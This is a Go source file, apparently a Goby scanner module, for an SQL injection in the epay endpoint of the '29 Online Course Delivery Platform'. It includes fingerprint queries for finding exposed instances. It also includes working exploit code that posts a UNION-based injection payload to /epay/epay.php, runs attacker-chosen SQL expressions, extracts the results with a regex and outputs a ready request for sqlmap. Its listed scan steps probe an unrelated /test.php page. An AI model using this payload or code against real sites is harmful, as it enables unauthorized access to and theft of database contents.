package exploits

import (
	"fmt"
	"regexp"
	"strings"

	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
)

func init() {
	expJson := `{
    "Name": "29 Online Class Delivery Platformepay SQL Injection Vulnerability",
    "Description": "<p>29 Online Course Delivery Platform is an online learning platform used to help students complete the learning tasks of online courses. This platform provides a variety of functions including login, registration, user interface, task progress list, etc. Users can manage their learning progress through the platform, view and submit assignments. </p><p>epay interface has SQL injection vulnerability, which can lead to database information leakage to obtain sensitive information, and may even be further exploited by attackers to cause greater harm.</p>",
    "Product": "29 Online Course Delivery Platform",
    "Homepage": "https://auth.timebk.cn/",
    "DisclosureDate": "2024-07-24",
    "PostTime": "2024-08-01",
    "Author": "1215816861@qq.com",
    "FofaQuery": "body=\"你在看什么呢？我写的代码好看吗\" && body=\"/apisub.php\"",
    "GobyQuery": "body=\"你在看什么呢？我写的代码好看吗\" && body=\"/apisub.php\"",
    "Level": "2",
    "Impact": "<p>epay interface has SQL injection vulnerability, which can lead to database information leakage to obtain sensitive information, and may even be further exploited by attackers to cause greater harm.</p>",
    "Recommendation": "<p>1. Pay attention to the official patch release information, install the patch or upgrade to the latest version:<a href=\"https://github.com/sylabs/sif\"></a><a href=\"https://auth.timebk.cn/\">https://auth.timebk.cn/</a></p><p>2. Deploy a web application firewall to monitor database operations. </p><p>3. If not necessary, prohibit public network access to the system.</p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "sql,sqlpoint",
            "show": ""
        },
        {
            "name": "sql",
            "type": "input",
            "value": "user()",
            "show": "attackType=sql"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "SQL Injection",
        "HW-2024"
    ],
    "VulType": [
        "SQL Injection"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "7.0",
    "Translation": {
        "CN": {
            "Name": "29网课交单平台 epay SQL 注入漏洞",
            "Product": "29网课交单平台",
            "Description": "<p>29网课交单平台是一个在线学习平台，用于帮助学生完成网络课程的学习任务。这个平台提供了包括登录、注册、用户界面、任务进度列表等多种功能,用户可以通过平台管理自己的学习进度，查看和提交作业等。<br></p><p>epay&nbsp;接口存在 SQL 注入漏洞，可导致数据库信息泄露从而获取敏感信息，甚至可能被攻击者进一步利用造成更大危害。<br></p>",
            "Recommendation": "<p>1、关注官方补丁发布信息，打上补丁或者升级到最新版本：<a href=\"https://auth.timebk.cn/\">https://auth.timebk.cn/</a><a href=\"https://github.com/sylabs/sif\"></a></p><p>2、部署Web应用防火墙，对数据库操作进行监控。&nbsp;</p><p>3、如非必要，禁止公网访问该系统。<br></p>",
            "Impact": "<p>epay&nbsp;接口存在 SQL 注入漏洞，可导致数据库信息泄露从而获取敏感信息，甚至可能被攻击者进一步利用造成更大危害。<br></p>",
            "VulType": [
                "SQL注入"
            ],
            "Tags": [
                "SQL注入",
                "HW-2024"
            ]
        },
        "EN": {
            "Name": "29 Online Class Delivery Platformepay SQL Injection Vulnerability",
            "Product": "29 Online Course Delivery Platform",
            "Description": "<p>29 Online Course Delivery Platform is an online learning platform used to help students complete the learning tasks of online courses. This platform provides a variety of functions including login, registration, user interface, task progress list, etc. Users can manage their learning progress through the platform, view and submit assignments.&nbsp;</p><p>epay interface has SQL injection vulnerability, which can lead to database information leakage to obtain sensitive information, and may even be further exploited by attackers to cause greater harm.<br></p>",
            "Recommendation": "<p>1. Pay attention to the official patch release information, install the patch or upgrade to the latest version:<a href=\"https://github.com/sylabs/sif\"></a><a href=\"https://auth.timebk.cn/\">https://auth.timebk.cn/</a></p><p>2. Deploy a web application firewall to monitor database operations.&nbsp;</p><p>3. If not necessary, prohibit public network access to the system.<br></p>",
            "Impact": "<p>epay interface has SQL injection vulnerability, which can lead to database information leakage to obtain sensitive information, and may even be further exploited by attackers to cause greater harm.<br></p>",
            "VulType": [
                "SQL Injection"
            ],
            "Tags": [
                "SQL Injection",
                "HW-2024"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10982"
}`

	setSqlPayloadHash_OSLvujquN935dK := func(hostInfo *httpclient.FixUrl, sql string) (resp *httpclient.HttpResponse, vulurl string, err error) {
		setPostRequest := func(hostInfo *httpclient.FixUrl, urlGet string, data string, head map[string]string) (*httpclient.HttpResponse, error) {
			PostRequest := httpclient.NewPostRequestConfig(urlGet)
			PostRequest.Timeout = 15
			PostRequest.VerifyTls = false
			PostRequest.FollowRedirect = false
			PostRequest.Data = data
			for headName, headValue := range head {
				PostRequest.Header.Store(headName, headValue)
			}
			return httpclient.DoHttpRequest(hostInfo, PostRequest)
		}

		urlget := `/epay/epay.php`
		data := `out_trade_no=' UNION ALL SELECT 1,CONCAT(IFNULL(CAST(` + sql + ` AS CHAR),0x20)),3,4,5,6,7,8,9,10,11,12,13-- -`

		header := map[string]string{
			"User-Agent":      "Mozilla/5.0 (Macintosh; Intel Mac OS X 12_10) AppleWebKit/600.1.25 (KHTML, like Gecko) Version/12.0 Safari/1200.1.25",
			"Accept":          "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3",
			"Accept-Language": "zh-CN,zh;q=0.9",
			"Content-Type":    "application/x-www-form-urlencoded",
			"Referer":         hostInfo.FixedHostInfo,
		}
		resp, err = setPostRequest(hostInfo, urlget, data, header)
		if err != nil || resp.StatusCode != 200 {
			return resp, "", err
		}

		//配置漏洞存在的路径
		vulurl = "/epay/epay.php"

		return resp, vulurl, nil
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {

			// 1.配置验证poc时返回包需存在的字符串，exmple:以mysql的报错注入为例，XPATH syntax error
			content := `827ccb0eea8a706c4c34a16891f84e7b`

			// 2. 设置sql语句,同样这个sql语句要设置到，exp_params中的custom参数中
			// 默认是MySQL / MariaDB数据库 : 用DATABASE()查询数据库名，用CONCAT()拼接字符, example:CONCAT(0x7e,(select user()),0x7e)
			// PostgreSQL : 用current_database()查询数据库名，用CONCAT()拼接字符
			// SQLite : 用database_list查询数据库名，用||拼接字符
			// SQL Server : 用DB_NAME()查询数据库名，用+拼接字符
			// Oracle : 用SELECT name FROM v$database查询数据库名，用concat()拼接字符
			sql := `md5(12345)`

			sendPayload := setSqlPayloadHash_OSLvujquN935dK

			resp, vulurl, err := sendPayload(hostInfo, sql)
			if err != nil || !strings.Contains(resp.RawBody, content) {
				return false
			}

			// 拼接SQL注入数据包的请求路径即可
			ss.VulURL = hostInfo.FixedHostInfo + vulurl
			return true
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {

			// 1.配置sqlpoint，供sqlmap工具使用
			sqlpoint := "POST /epay/epay.php HTTP/1.1\nHost: " + expResult.HostInfo.HostInfo + "\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 12_10) AppleWebKit/600.1.25 (KHTML, like Gecko) Version/12.0 Safari/1200.1.25\nContent-Length: 113\nContent-Type: application/x-www-form-urlencoded\n\nout_trade_no=' UNION ALL SELECT 1,CONCAT(IFNULL(CAST(md5(123) AS CHAR),0x20)),3,4,5,6,7,8,9,10,11,12,13-- -"

			// 2.配置正则语句，从响应包中提取出数据
			regular := `<input type='hidden' name='out_trade_no' value='([\s\S]*?)'/><input`

			makeRegular := func(RegularContent string, RegularUrl string) (string, error) {
				reRequest := regexp.MustCompile(RegularUrl)
				if !reRequest.MatchString(RegularContent) {
					return "", fmt.Errorf("can't match value")
				}
				getname := reRequest.FindStringSubmatch(RegularContent)
				return getname[1], nil
			}

			sendPayload := setSqlPayloadHash_OSLvujquN935dK
			attacktype := goutils.B2S(ss.Params["attackType"])

			switch attacktype {

			case "sql":
				sql := goutils.B2S(ss.Params["sql"])
				resp, _, err := sendPayload(expResult.HostInfo, sql)
				if err != nil {
					expResult.Output = `Exploitation failed` + err.Error()
					expResult.Success = false
					return expResult
				}

				output, err := makeRegular(resp.RawBody, regular)
				if err != nil || output == "" {
					expResult.Success = false
					expResult.Output = "Exploitation failed "
					return expResult
				}
				expResult.Success = true
				expResult.Output = output

			case "sqlpoint":
				expResult.Success = true
				expResult.Output = sqlpoint

			default:
				expResult.Success = false
				expResult.Output = "Unknown attack type"

			}
			return expResult
		},
	))
}
